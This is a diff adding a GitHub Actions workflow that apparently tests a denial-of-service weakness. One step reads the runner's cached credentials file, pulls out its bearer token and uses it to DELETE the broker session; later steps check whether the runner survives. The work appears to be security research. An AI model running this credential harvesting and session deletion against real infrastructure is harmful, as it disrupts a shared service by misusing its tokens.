@@ -1,0 +1,32 @@
+name: Session DoS Test
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Step 1 - baseline (before session delete)
+        run: echo "Step 1 OK - runner connected"
+        
+      - name: Step 2 - delete HCA session
+        run: |
+          CREDS="/home/runner/actions-runner/cached/*/.credentials"
+          for f in $CREDS; do
+            TOKEN=$(python3 -c "import json; print(json.load(open('$f'))['Data']['token'])")
+            echo "Deleting HCA broker session..."
+            curl -s -w "DELETE: %{http_code}\n" -X DELETE \
+              -H "Authorization: Bearer $TOKEN" \
+              "https://broker.actions.githubusercontent.com/session"
+            break
+          done
+          
+      - name: Step 3 - does the runner still work after session delete?
+        run: |
+          echo "Step 3 - if this runs, session delete didn't break the runner"
+          echo "The runner agent uses a DIFFERENT connection than the broker session"
+          
+      - name: Step 4 - try to upload artifact (tests pipeline connection)
+        run: echo "artifact-test" > /tmp/test.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: post-delete-artifact
+          path: /tmp/test.txt
